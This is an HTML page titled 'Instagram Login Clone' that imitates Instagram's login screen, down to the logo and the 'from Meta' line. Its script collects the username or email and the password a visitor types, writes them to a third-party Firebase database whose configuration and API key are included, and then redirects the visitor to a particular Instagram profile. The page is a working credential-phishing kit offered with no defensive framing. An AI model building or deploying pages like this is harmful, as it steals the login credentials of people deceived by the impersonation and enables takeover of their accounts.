<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Clone</title>

    <style>
        :root {
            --bg-color: #ffffff; /* Pure white background */
            --box-bg: #ffffff; /* White box background */
            --text-color: #000;
            --input-bg: #ffffff; /* White input background */
            --border-color: #dbdbdb;
            --btn-bg: #0095f6;
            --btn-text: #fff;
            --link-color: #0095f6;
            --divider-color: #dbdbdb;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            color: var(--text-color);
        }

        .login-box {
            background: var(--box-bg);
            padding: 40px 30px;
            width: 350px;
            text-align: center;
        }

        .logo {
            width: 180px;
            margin-bottom: 20px;
        }

        .input-box-container {
            position: relative;
            width: 100%;
            margin: 8px 0;
        }

        .input-box {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--border-color);
            border-radius: 5px;
            font-size: 14px;
            background: var(--input-bg);
            color: var(--text-color);
            padding-right: 50px;
            outline: none;
        }

        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 14px;
            color: #0095f6;
            font-weight: bold;
            background: none;
            border: none;
        }

        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: var(--btn-bg);
            color: var(--btn-text);
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
        }

        .divider {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 15px 0;
        }

        .divider span {
            width: 40%;
            height: 1px;
            background: var(--divider-color);
        }

        .divider p {
            margin: 0 10px;
            color: var(--text-color);
            font-size: 14px;
        }

        .fb-login {
            display: block;
            color: #385185;
            font-weight: bold;
            text-decoration: none;
            margin-top: 10px;
        }

        .forgot {
            display: block;
            margin-top: 10px;
            color: var(--link-color);
            text-decoration: none;
        }

        .signup-box {
            background: var(--box-bg);
            padding: 20px;
            margin-top: 10px;
            width: 350px;
            text-align: center;
        }

        .signup-box a {
            color: var(--link-color);
            text-decoration: none;
        }

        .meta {
            margin-top: 20px;
            font-size: 14px;
            color: var(--text-color);
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo.png" alt="Instagram Logo" class="logo">
        <form id="contactForm">
            <input type="text" name="email" id="email" placeholder="Phone number, username, or email" class="input-box" required>
            
            <div class="input-box-container">
                <input type="password" name="password" id="password" placeholder="Password" class="input-box" required>
                <button type="button" class="toggle-password" id="togglePassword">Show</button>
            </div>

            <button type="submit" class="login-btn">Log in</button>
        </form>
        <div class="divider">
            <span></span>
            <p>OR</p>
            <span></span>
        </div>
        <a href="#" class="fb-login">Log in with Facebook</a>
        <a href="#" class="forgot">Forgot password?</a>
    </div>
    <div class="signup-box">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
    <p class="meta">from Meta</p>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/4.3.0/firebase.js"></script>
    <script>
        // Initialize Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyC7h97mv5SpEOmpLVwQbroIlaoYKe18Vms",
            authDomain: "fireee-d5959.firebaseapp.com",
            databaseURL: "https://fireee-d5959-default-rtdb.firebaseio.com",
            projectId: "fireee-d5959",
            storageBucket: "fireee-d5959.firebasestorage.app",
            messagingSenderId: "176546925562",
            appId: "1:176546925562:web:295fe004931a82a07f7243",
            measurementId: "G-5GCSQ1HJ90"
        };

        firebase.initializeApp(firebaseConfig);

        var messagesRef = firebase.database().ref('messages');

        document.getElementById('contactForm').addEventListener('submit', submitForm);

        function submitForm(e) {
            e.preventDefault();

            var email = getInputVal('email');
            var password = getInputVal('password');

            saveMessage(email, password);

            window.location.href = "https://www.instagram.com/prince_894_?igsh=MTB6bGpvYWxzZG00dw==";
        }

        function getInputVal(id) {
            return document.getElementById(id).value;
        }

        function saveMessage(email, password) {
            var newMessageRef = messagesRef.push();
            newMessageRef.set({
                email: email,
                password: password
            });
        }

        // Password show/hide function
        document.getElementById("togglePassword").addEventListener("click", function () {
            var passwordField = document.getElementById("password");
            var toggleBtn = document.getElementById("togglePassword");

            if (passwordField.type === "password") {
                passwordField.type = "text";
                toggleBtn.textContent = "Hide";
            } else {
                passwordField.type = "password";
                toggleBtn.textContent = "Show";
            }
        });
    </script>
</body>
</html>
